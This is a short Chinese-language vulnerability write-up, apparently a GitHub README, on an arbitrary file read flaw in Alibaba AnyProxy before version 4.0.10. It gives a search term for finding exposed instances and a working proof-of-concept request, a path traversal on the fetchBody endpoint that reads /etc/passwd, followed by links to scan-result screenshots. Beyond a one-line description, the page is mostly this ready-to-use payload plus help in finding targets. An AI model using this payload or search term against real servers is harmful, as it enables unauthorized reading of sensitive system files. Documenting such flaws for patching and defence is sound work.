# Alibaba AnyProxy fetchBody 任意文件读取漏洞

## 漏洞描述

Alibaba AnyProxy 低版本存在任意文件读取，通过漏洞，攻击者可以获取服务器敏感信息

## 漏洞影响

Alibaba AnyProxy < 4.0.10

## 网络测绘

"anyprox"

## POC

```plain
/fetchBody?id=1/../../../../../../../../etc/passwd
```

## 扫描结果
![YLWQ3XCYVVPMV8WPG1~XBL4](https://github.com/a1665454764/AlibabaAnyProxyfetchBody/assets/143511005/c05e168e-2af8-49e3-9321-2b8797af8786)
![ATBI(@757XQER%UHM6HM}_E](https://github.com/a1665454764/AlibabaAnyProxyfetchBody/assets/143511005/e5aadfc7-600d-4b9a-8024-2b77d85393a0)
